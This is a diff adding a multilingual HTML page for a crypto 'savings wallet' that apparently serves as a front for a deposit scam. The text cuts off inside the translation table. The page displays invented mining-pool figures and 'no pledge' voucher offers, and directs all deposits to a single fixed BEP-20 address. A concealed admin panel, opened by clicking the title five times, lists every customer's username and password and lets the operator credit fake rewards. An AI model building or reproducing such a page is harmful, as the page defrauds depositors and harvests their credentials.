@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SAVINGS WALLET</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .banner-bg {
+            background: linear-gradient(135deg, #091e3a 0%, #1e3a8a 50%, #2563eb 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        .banner-bg::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 250px;
+            height: 250px;
+            background: radial-gradient(circle, rgba(59,130,246,0.4) 0%, rgba(37,99,235,0) 70%);
+            border-radius: 50%;
+            z-index: 1;
+        }
+        .coin-float {
+            animation: floatCoin 3s ease-in-out infinite;
+        }
+        @keyframes floatCoin {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-6px) rotate(5deg); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fade-in {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+        .lang-scroll-list::-webkit-scrollbar {
+            width: 5px;
+        }
+        .lang-scroll-list::-webkit-scrollbar-track {
+            background: #f1f5f9;
+        }
+        .lang-scroll-list::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen pb-24 select-none">
+
+    <!-- TOP BAR -->
+    <header class="bg-white shadow-sm p-3 flex justify-between items-center sticky top-0 z-40">
+        
+        <!-- MENU ĐỔ NGÔN NGỮ TOÀN CẦU (ĐẦY ĐỦ 20+ NGÔN NGỮ) -->
+        <div class="relative inline-block text-left">
+            <button onclick="toggleLangMenu()" id="lang-btn" class="bg-gray-50 border border-gray-200 text-gray-700 text-xs font-semibold rounded-lg px-2.5 py-1.5 flex items-center space-x-1 hover:bg-gray-100">
+                <span id="current-lang-text">English</span>
+                <i class="fa-solid fa-chevron-down text-[10px] text-gray-400"></i>
+            </button>
+            <div id="lang-dropdown" class="hidden absolute left-0 mt-2 w-48 bg-white border border-gray-100 rounded-xl shadow-xl z-50 overflow-hidden">
+                <div class="max-h-64 overflow-y-auto py-1 text-xs text-gray-700 lang-scroll-list">
+                    <button onclick="selectLanguage('en', 'English')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">English (US/UK)</button>
+                    <button onclick="selectLanguage('vi', 'Tiếng Việt')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Tiếng Việt (Vietnam)</button>
+                    <button onclick="selectLanguage('zh', '中文')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">中文 (China)</button>
+                    <button onclick="selectLanguage('ja', '日本語')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">日本語 (Japan)</button>
+                    <button onclick="selectLanguage('ko', '한국어')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">한국어 (Korea)</button>
+                    <button onclick="selectLanguage('es', 'Español')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Español (Spain)</button>
+                    <button onclick="selectLanguage('fr', 'Français')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Français (France)</button>
+                    <button onclick="selectLanguage('de', 'Deutsch')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Deutsch (Germany)</button>
+                    <button onclick="selectLanguage('ru', 'Русский')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Русский (Russia)</button>
+                    <button onclick="selectLanguage('pt', 'Português')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Português (Brazil)</button>
+                    <button onclick="selectLanguage('ar', 'العربية')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">العربية (Arabic)</button>
+                    <button onclick="selectLanguage('hi', 'हिन्दी')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">हिन्दी (India)</button>
+                    <button onclick="selectLanguage('id', 'Bahasa Indonesia')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Bahasa Indonesia</button>
+                    <button onclick="selectLanguage('th', 'ไทย')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">ไทย (Thailand)</button>
+                    <button onclick="selectLanguage('it', 'Italiano')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Italiano (Italy)</button>
+                    <button onclick="selectLanguage('tr', 'Türkçe')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Türkçe (Turkey)</button>
+                    <button onclick="selectLanguage('nl', 'Nederlands')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Nederlands (Netherlands)</button>
+                    <button onclick="selectLanguage('pl', 'Polski')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Polski (Poland)</button>
+                    <button onclick="selectLanguage('sv', 'Svenska')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Svenska (Sweden)</button>
+                    <button onclick="selectLanguage('fil', 'Filipino')" class="w-full text-left px-3 py-2 hover:bg-blue-50 hover:text-blue-600 font-medium border-b border-gray-50">Filipino (Philippines)</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TÊN ỨNG DỤNG (Bấm liên tiếp 5 lần để mở bảng ADM Quản Lý Ẩn) -->
+        <div class="absolute left-1/2 transform -translate-x-1/2 cursor-pointer" onclick="handleAdminSecretClick()" title="System Portal">
+            <span id="txt-app-title" class="font-bold text-sm md:text-base text-gray-800 tracking-wide">SAVINGS WALLET</span>
+        </div>
+
+        <!-- RIGHT ACTIONS: AUTH / USER -->
+        <div class="flex items-center space-x-2">
+            <button onclick="openAuthModal()" id="auth-nav-btn" class="bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs px-3 py-1.5 rounded-lg transition shadow">
+                Login / Register
+            </button>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="max-w-md mx-auto p-4 space-y-4">
+
+        <!-- TAB 1: TRANG CHỦ (HOME) -->
+        <div id="tab-home" class="space-y-4">
+            
+            <!-- HERO BANNER -->
+            <div class="relative rounded-2xl overflow-hidden banner-bg text-white p-6 shadow-xl border border-blue-400/20">
+                <div class="pr-24 z-10 relative">
+                    <div class="flex items-center space-x-2 mb-1">
+                        <span class="bg-blue-500/40 text-blue-200 text-[10px] font-semibold px-2 py-0.5 rounded-full border border-blue-300/30">Secure Vault</span>
+                        <span class="bg-emerald-500/30 text-emerald-300 text-[10px] font-semibold px-2 py-0.5 rounded-full border border-emerald-300/30">USDT / BNB</span>
+                    </div>
+                    <h1 id="banner-title" class="text-2xl font-extrabold leading-tight tracking-wide drop-shadow">Receive Voucher</h1>
+                    <h2 id="banner-subtitle" class="text-lg font-bold text-blue-200">No pledge</h2>
+                    <p id="banner-desc" class="text-xs text-blue-100 mt-2 opacity-90">Join the node and start mining</p>
+                </div>
+                
+                <div class="absolute right-4 top-1/2 transform -translate-y-1/2 flex items-center justify-center z-20">
+                    <div class="relative w-20 h-20 bg-gradient-to-tr from-blue-600 to-indigo-500 rounded-2xl flex items-center justify-center shadow-2xl border-2 border-white/30 coin-float backdrop-blur-md">
+                        <i class="fa-solid fa-wallet text-3xl text-yellow-300 drop-shadow-md"></i>
+                        <div class="absolute -bottom-2 -right-2 bg-emerald-500 text-white text-[10px] font-extrabold px-1.5 py-0.5 rounded-full shadow-md border border-white">
+                            USDT
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-5 flex justify-between items-center relative z-10">
+                    <button onclick="openDepositModal()" class="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2 rounded-xl shadow-lg transition flex items-center space-x-1.5">
+                        <i class="fa-solid fa-qrcode"></i>
+                        <span id="btn-deposit-hub">Deposit Hub</span>
+                    </button>
+                    <button onclick="openCertificateModal()" id="btn-cert" class="bg-white/95 backdrop-blur-sm text-gray-900 text-xs font-bold px-4 py-2 rounded-xl shadow-lg hover:bg-white transition border border-gray-100 flex items-center space-x-1.5">
+                        <i class="fa-solid fa-shield-halved text-blue-600"></i>
+                        <span>Certificate</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- POOL DATA -->
+            <div class="bg-white rounded-2xl p-5 shadow-sm space-y-4">
+                <h3 id="pool-data-title" class="text-center font-bold text-gray-800 text-lg mb-2">Pool Data</h3>
+                <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                    <span id="label-total-output" class="text-sm text-gray-500">Total Output</span>
+                    <span class="font-bold text-blue-700">9,153,176.23 BNB</span>
+                </div>
+                <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                    <span id="label-valid-nodes" class="text-sm text-gray-500">Valid Nodes</span>
+                    <span class="font-bold text-blue-700">590,026</span>
+                </div>
+                <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                    <span id="label-participants" class="text-sm text-gray-500">Participants</span>
+                    <span class="font-bold text-gray-800">760,435</span>
+                </div>
+                <div class="flex justify-between items-center pt-1">
+                    <span id="label-user-revenue" class="text-sm text-gray-500">User Revenue</span>
+                    <span class="font-bold text-gray-800">≈ 1,492,587,121.89 USDT</span>
+                </div>
+            </div>
+
+            <!-- OUTPUT DETAILS -->
+            <div class="bg-white rounded-2xl p-5 shadow-sm space-y-3">
+                <h3 id="output-details-title" class="font-bold text-gray-800 text-lg mb-2">Output details</h3>
+                <div class="flex justify-between text-xs text-gray-400 font-semibold border-b pb-2">
+                    <span id="table-addr">Address</span>
+                    <span id="table-qty">Quantity</span>
+                </div>
+                <div id="output-list" class="space-y-3 text-sm">
+                    <div class="flex justify-between items-center">
+                        <span class="text-blue-600 font-medium">0x3f9acc...900270</span>
+                        <span class="font-semibold text-gray-700">0.076273 BNB</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: RÚT TIỀN (WITHDRAWAL) -->
+        <div id="tab-withdrawal" class="hidden space-y-4">
+            <div class="bg-white rounded-2xl p-5 shadow-sm space-y-4">
+                <h3 id="withdrawal-title" class="font-bold text-gray-800 text-lg">Withdrawal</h3>
+                <div>
+                    <label id="withdrawal-label" class="block text-xs font-semibold text-gray-500 mb-1">WITHDRAW AMOUNT (USDT)</label>
+                    <input type="number" id="withdraw-input" placeholder="0.00" class="w-full border rounded-lg p-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button id="withdrawal-btn" onclick="requestWithdrawal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow transition">
+                    Confirm Withdrawal
+                </button>
+            </div>
+        </div>
+
+        <!-- TAB 3: TÀI KHOẢN (ACCOUNT) -->
+        <div id="tab-account" class="hidden space-y-4">
+            <div class="bg-white rounded-2xl p-5 shadow-sm space-y-4 border border-gray-100">
+                <div class="flex justify-between items-center text-gray-500 text-sm">
+                    <span id="acc-accumulated">Accumulated Income</span>
+                    <span class="text-xs bg-blue-50 text-blue-600 font-bold px-2 py-1 rounded-md" id="user-tier-badge">Standard Tier</span>
+                </div>
+                <div class="text-2xl font-bold text-blue-600" id="user-display-balance">0.000000 BNB</div>
+                <div class="grid grid-cols-2 gap-4 pt-2 border-t border-gray-100 text-sm">
+                    <div>
+                        <div id="acc-today" class="text-gray-400 text-xs">Today's Income</div>
+                        <div class="font-semibold text-blue-600 mt-0.5">0.000000 BNB</div>
+                    </div>
+                    <div class="text-right">
+                        <div id="acc-yield" class="text-gray-400 text-xs">Market Yield</div>
+                        <div id="bnb-market-rate" class="font-semibold text-gray-600 mt-0.5">Loading...</div>
+                    </div>
+                </div>
+                <div class="grid grid-cols-2 gap-4 pt-2 border-t border-gray-100 text-sm">
+                    <div>
+                        <div id="acc-pool-wallet" class="text-gray-400 text-xs">Pool Wallet</div>
+                        <div id="bnb-price-usd" class="font-semibold text-blue-600 mt-0.5">$... USDT</div>
+                    </div>
+                    <div class="text-right">
+                        <div id="acc-wallet-bal" class="text-gray-400 text-xs">Wallet Balance</div>
+                        <div id="user-usdt-balance" class="font-semibold text-blue-600 mt-0.5">0.00 USDT</div>
+                    </div>
+                </div>
+            </div>
+            <button onclick="openDepositModal()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl shadow transition flex items-center justify-center space-x-2">
+                <i class="fa-solid fa-qrcode"></i>
+                <span id="btn-quick-deposit">Deposit Fixed Wallet</span>
+            </button>
+        </div>
+    </main>
+
+    <!-- NÚT CSKH NỔI BẬT NGOÀI HOME -->
+    <div class="fixed bottom-20 right-4 z-40 flex flex-col items-end space-y-2">
+        <div id="support-tooltip" class="bg-gray-900 text-white text-[11px] px-3 py-1.5 rounded-xl shadow-lg animate-bounce">
+            Live Support 24/7!
+        </div>
+        <button onclick="openSupportChat()" class="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white w-14 h-14 rounded-full shadow-2xl flex items-center justify-center text-2xl transition transform hover:scale-110 border-2 border-white">
+            <i class="fa-solid fa-headset"></i>
+        </button>
+    </div>
+
+    <!-- MODAL 1: ĐĂNG NHẬP / ĐĂNG KÝ -->
+    <div id="auth-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl relative space-y-4 border border-gray-100">
+            <button onclick="closeAuthModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="text-center space-y-1">
+                <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto text-xl mb-2">
+                    <i class="fa-solid fa-user-lock"></i>
+                </div>
+                <h3 class="text-lg font-bold text-gray-800">Login / Register</h3>
+                <p class="text-xs text-gray-500">Secure Account Management</p>
+            </div>
+            <div class="space-y-3 pt-2">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-600 mb-1">Username:</label>
+                    <input type="text" id="auth-username" placeholder="Enter username..." class="w-full border rounded-lg p-2.5 text-xs focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-600 mb-1">Password:</label>
+                    <input type="password" id="auth-password" placeholder="••••••••" class="w-full border rounded-lg p-2.5 text-xs focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button onclick="handleUserAuth()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl text-xs transition shadow">
+                    Login / Register Now
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL 2: CỔNG NẠP TIỀN CỐ ĐỊNH -->
+    <div id="deposit-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl relative space-y-4 border border-gray-100 text-center">
+            <button onclick="closeDepositModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="w-12 h-12 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-xl mb-2">
+                <i class="fa-solid fa-qrcode"></i>
+            </div>
+            <h3 class="text-lg font-bold text-gray-800">Fixed Deposit Hub</h3>
+            <p class="text-xs text-gray-500">Transfer USDT/BNB via BEP-20 Network to address:</p>
+            <div class="bg-gray-50 p-3 rounded-xl border border-gray-200">
+                <div class="text-[11px] font-mono text-blue-600 font-bold break-all">0x6d617b8F9423c10aB2718ef8902A1b23C98f8F9</div>
+            </div>
+            <button onclick="copyDepositAddress()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold py-2 rounded-xl text-xs transition">
+                Copy Wallet Address
+            </button>
+        </div>
+    </div>
+
+    <!-- MODAL 3: HỆ THỐNG ADM QUẢN LÝ ẨN -->
+    <div id="admin-modal" class="hidden fixed inset-0 bg-black/70 backdrop-blur-md z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl relative space-y-4 border border-gray-200 max-h-[90vh] overflow-y-auto">
+            <button onclick="closeAdminModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="text-center space-y-1">
+                <div class="w-12 h-12 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center mx-auto text-xl mb-2">
+                    <i class="fa-solid fa-user-shield"></i>
+                </div>
+                <h3 class="text-lg font-bold text-gray-800">Hệ Thống ADM Quản Lý Toàn Diện</h3>
+                <p class="text-xs text-purple-600 font-semibold">Kiểm soát tài khoản, mật khẩu, phát thưởng & CSKH</p>
+            </div>
+
+            <div class="flex border-b text-xs font-semibold">
+                <button onclick="switchAdminTab('users')" id="adm-tab-users" class="flex-1 py-2 border-b-2 border-purple-600 text-purple-600">Tài Khoản & Mật Khẩu</button>
+                <button onclick="switchAdminTab('rewards')" id="adm-tab-rewards" class="flex-1 py-2 text-gray-400">Phát Thưởng / Số Dư</button>
+                <button onclick="switchAdminTab('chats')" id="adm-tab-chats" class="flex-1 py-2 text-gray-400">Hỗ Trợ CSKH (<span id="chat-count">0</span>)</button>
+            </div>
+
+            <div id="adm-content-users" class="space-y-2 text-xs">
+                <p class="text-gray-500 font-medium">Toàn bộ tên đăng nhập và mật khẩu khách hàng:</p>
+                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-user-list-container">
+                    <div class="text-gray-400 text-center py-4">Chưa có khách hàng đăng ký tài khoản nào.</div>
+                </div>
+            </div>
+
+            <div id="adm-content-rewards" class="hidden space-y-3 text-xs">
+                <div>
+                    <label class="block font-semibold text-gray-600 mb-1">Chọn Khách Hàng:</label>
+                    <select id="admin-target-user" class="w-full border rounded-lg p-2 bg-gray-50">
+                        <option value="all">Tất cả người dùng (Broadcast)</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block font-semibold text-gray-600 mb-1">Số tiền thưởng thêm (USDT):</label>
+                    <input type="number" id="admin-reward-amount" placeholder="Ví dụ: 100.00" class="w-full border rounded-lg p-2">
+                </div>
+                <button onclick="adminExecuteReward()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 rounded-xl transition shadow">
+                    Xác Nhận Phát Thưởng Cho Khách Hàng
+                </button>
+            </div>
+
+            <div id="adm-content-chats" class="hidden space-y-3 text-xs">
+                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-chat-container">
+                    <div class="text-gray-400 text-center py-4">Chưa có yêu cầu hỗ trợ nào từ khách hàng.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL 4: CỬA SỔ KHUNG CHAT CSKH CHO KHÁCH HÀNG (ĐỒNG BỘ ĐA NGÔN NGỮ ĐẦY ĐỦ) -->
+    <div id="support-chat-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-5 shadow-2xl relative space-y-3 border border-gray-100">
+            <button onclick="closeSupportChat()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="flex items-center space-x-2 border-b pb-2">
+                <div class="w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-sm">
+                    <i class="fa-solid fa-headset"></i>
+                </div>
+                <div>
+                    <h4 id="chat-title" class="font-bold text-gray-800 text-sm">24/7 Live Support</h4>
+                    <p id="chat-status" class="text-[10px] text-emerald-600 font-semibold">● ADM Online</p>
+                </div>
+            </div>
+            <div id="chat-messages-box" class="h-40 overflow-y-auto border rounded-xl p-2 bg-gray-50 text-xs space-y-2">
+                <div id="chat-welcome-msg" class="bg-blue-50 text-blue-800 p-2 rounded-lg">Hello! How can ADM assist your savings wallet transactions today?</div>
+            </div>
+            <div class="flex space-x-2">
+                <input type="text" id="user-chat-input" placeholder="Type your message..." class="flex-1 border rounded-xl px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <button onclick="sendUserMessage()" id="btn-chat-send" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-xl text-xs font-bold">Send</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL 5: CHỨNG NHẬN BẢO CHỨNG -->
+    <div id="certificate-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl relative space-y-4 border border-gray-100 max-h-[90vh] overflow-y-auto">
+            <button onclick="closeCertificateModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="text-center space-y-1">
+                <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto text-2xl mb-2">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                <h3 class="text-lg font-bold text-gray-800">SAVINGS DEPOSIT CERTIFICATE</h3>
+                <p class="text-xs text-blue-600 font-semibold tracking-wide">SAVINGS WALLET PROTOCOL</p>
+            </div>
+            <button onclick="closeCertificateModal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl text-xs transition shadow">Understood & Confirm</button>
+        </div>
+    </div>
+
+    <!-- BOTTOM NAVIGATION -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 px-6 flex justify-around items-center z-40">
+        <button onclick="switchTab('home')" id="nav-home" class="flex flex-col items-center text-blue-600 font-medium">
+            <i class="fa-solid fa-house text-xl"></i>
+            <span id="nav-home-text" class="text-[11px] mt-1">Home</span>
+        </button>
+        <button onclick="switchTab('withdrawal')" id="nav-withdrawal" class="flex flex-col items-center text-gray-400 font-medium">
+            <i class="fa-solid fa-briefcase text-xl"></i>
+            <span id="nav-withdrawal-text" class="text-[11px] mt-1">Withdrawal</span>
+        </button>
+        <button onclick="switchTab('account')" id="nav-account" class="flex flex-col items-center text-gray-400 font-medium">
+            <i class="fa-solid fa-user text-xl"></i>
+            <span id="nav-account-text" class="text-[11px] mt-1">Account</span>
+        </button>
+    </nav>
+
+    <!-- JAVASCRIPT ĐỒNG BỘ ĐA NGÔN NGỮ -->
+    <script>
+        const translations = {
+            en: {
+                appTitle: "SAVINGS WALLET", bannerTitle: "Receive Voucher", bannerSubtitle: "No pledge", bannerDesc: "Join the node and start mining", btnCert: "Certificate", btnDepositHub: "Deposit Hub", poolDataTitle: "Pool Data", totalOutput: "Total Output", validNodes: "Valid Nodes", participants: "Participants", userRevenue: "User Revenue", outputDetailsTitle: "Output details", tableAddr: "Address", tableQty: "Quantity", withdrawalTitle: "Withdrawal", withdrawalLabel: "WITHDRAW AMOUNT (USDT)", withdrawalBtn: "Confirm Withdrawal", accAccumulated: "Accumulated Income", accToday: "Today's Income", accYield: "Market Yield", accPoolWallet: "Pool Wallet", accWalletBal: "Wallet Balance", navHome: "Home", navWithdrawal: "Withdrawal", navAccount: "Account", btnQuickDeposit: "Deposit Fixed Wallet", tooltipSupport: "Live Support 24/7!", chatTitle: "24/7 Live Support", chatStatus: "● ADM Online", chatWelcomeMsg: "Hello! How can ADM assist your savings wallet transactions today?", chatPlaceholder: "Type your message...", btnChatSend: "Send"
+            },
+            vi: {
+                appTitle: "VÍ TIẾT KIỆM", bannerTitle: "Nhận Voucher", bannerSubtitle: "Không cam kết", bannerDesc: "Tham gia nút và bắt đầu khai thác", btnCert: "Chứng chỉ", btnDepositHub: "Cổng Nạp Tiền", poolDataTitle: "Dữ liệu nhóm", totalOutput: "Tổng sản lượng", validNodes: "Nút hợp lệ", participants: "Người tham gia", userRevenue: "Doanh thu của người dùng", outputDetailsTitle: "Chi tiết đầu ra", tableAddr: "Địa chỉ", tableQty: "Số lượng", withdrawalTitle: "Rút tiền", withdrawalLabel: "SỐ TIỀN RÚT (USDT)", withdrawalBtn: "Xác nhận rút", accAccumulated: "Thu nhập tích lũy", accToday: "Thu nhập hôm nay", accYield: "Năng suất thị trường", accPoolWallet: "Ví đựng tiền Pool", accWalletBal: "Số dư ví", navHome: "Trang chủ", navWithdrawal: "Rút tiền", navAccount: "Tài khoản", btnQuickDeposit: "Nạp Tiền Vào Ví Cố Định", tooltipSupport: "Chat với ADM CSKH 24/7!", chatTitle: "Hỗ Trợ Khách Hàng 24/7", chatStatus: "● ADM đang trực tuyến", chatWelcomeMsg: "Xin chào! ADM có thể hỗ trợ gì cho giao dịch hoặc tài khoản tiết kiệm của bạn?", chatPlaceholder: "Nhập nội dung cần hỗ trợ...", btnChatSend: "Gửi"
+            },
+            zh: {
+                appTitle: "储蓄钱包", bannerTitle: "领取优惠券", bannerSubtitle: "无质押", bannerDesc: "加入节点并开始挖矿", btnCert: "证书", btnDepositHub: "充值中心", poolDataTitle: "池数据", totalOutput: "总产出", validNodes: "有效节点", participants: "参与者", userRevenue: "用户收益", outputDetailsTitle: "产出详情", tableAddr: "地址", tableQty: "数量", withdrawalTitle: "提现", withdrawalLabel: "提现金额 (USDT)", withdrawalBtn: "确认提现", accAccumulated: "累计收入", accToday: "今日收入", accYield: "市场收益率", accPoolWallet: "矿池钱包", accWalletBal: "钱包余额", navHome: "首页", navWithdrawal: "提现", navAccount: "账户", btnQuickDeposit: "充值到固定钱包", tooltipSupport: "24/7 在线客服！", chatTitle: "24/7 在线客服", chatStatus: "● 管理员在线", chatWelcomeMsg: "您好！请问管理员今天能为您的储蓄钱包交易提供什么帮助？", chatPlaceholder: "输入您的消息...", btnChatSend: "发送"
+            },
+            ja: {
+                appTitle: "セーブウォレット", bannerTitle: "バウチャー受取", bannerSubtitle: "誓約なし", bannerDesc: "ノードに参加してマイニング開始", btnCert: "証明書", btnDepositHub: "入金ハブ", poolDataTitle: "プールデータ", totalOutput: "総出力", validNodes: "有効ノード", participants: "参加者", userRevenue: "ユーザー収益", outputDetailsTitle: "出力詳細", tableAddr: "アドレス", tableQty: "数量", withdrawalTitle: "出金", withdrawalLabel: "出金額 (USDT)", withdrawalBtn: "出金を確認", accAccumulated: "累計収益", accToday: "本日の収益", accYield: "市場利回り", accPoolWallet: "プールウォレット", accWalletBal: "ウォレット残高", navHome: "ホーム", navWithdrawal: "出金", navAccount: "アカウント", btnQuickDeposit: "固定ウォレットに入金", tooltipSupport: "24/7 ライブサポート！", chatTitle: "24/7 ライブサポート", chatStatus: "● 管理者オンライン", chatWelcomeMsg: "こんにちは！セーブウォレットのお取引についてサポートいたします。", chatPlaceholder: "メッセージを入力...", btnChatSend: "送信"
+            },
+            ko: {
+                appTitle: "저축 지갑", bannerTitle: "바우처 받기", bannerSubtitle: "서약 없음", bannerDesc: "노드에 참여하고 채굴 시작", btnCert: "증명서", btnDepositHub: "입금 센터", poolDataTitle: "풀 데이터", totalOutput: "총 출력", validNodes: "유효 노드", participants: "참여자", userRevenue: "사용자 수익", outputDetailsTitle: "출력 세부 정보", tableAddr: "주소", tableQty: "수량", withdrawalTitle: "출금", withdrawalLabel: "출금 금액 (USDT)", withdrawalBtn: "출금 확인", accAccumulated: "누적 수익", accToday: "오늘의 수익", accYield: "시장 수익률", accPoolWallet: "풀 지갑", accWalletBal: "지갑 잔액", navHome: "홈", navWithdrawal: "출금", navAccount: "계정", btnQuickDeposit: "고정 지갑에 입금", tooltipSupport: "24/7 실시간 지원!", chatTitle: "24/7 실시간 지원", chatStatus: "● 관리자 온라인", chatWelcomeMsg: "안녕하세요! 저축 지갑 거래에 대해 도움을 드리겠습니다.", chatPlaceholder: "메시지 입력...", btnChatSend: "전송"
+            },
+            es: {
+                appTitle: "CARTERA DE AHORROS", bannerTitle: "Recibir Cupón", bannerSubtitle: "Sin compromiso", bannerDesc: "Únete al nodo y comienza a minar", btnCert: "Certificado", btnDepositHub: "Centro de Depósito", poolDataTitle: "Datos del Pool", totalOutput: "Producción Total", validNodes: "Nodos Válidos", participants: "Participantes", userRevenue: "Ingresos de Usuarios", outputDetailsTitle: "Detalles de Salida", tableAddr: "Dirección", tableQty: "Cantidad", withdrawalTitle: "Retiro", withdrawalLabel: "MONTO A RETIRAR (USDT)", withdrawalBtn: "Confirmar Retiro", accAccumulated: "Ingresos Acumulados", accToday: "Ingresos de Hoy", accYield: "Rendimiento de Mercado", accPoolWallet: "Billetera Pool", accWalletBal: "Saldo de Billetera", navHome: "Inicio", navWithdrawal: "Retiro", navAccount: "Cuenta", btnQuickDeposit: "Depositar en Billetera Fija", tooltipSupport: "¡Soporte 24/7!", chatTitle: "Soporte en Vivo 24/7", chatStatus: "● ADM En Línea", chatWelcomeMsg: "¡Hola! ¿En qué puede ayudarle el administrador hoy?", chatPlaceholder: "Escribe tu mensaje...", btnChatSend: "Enviar"
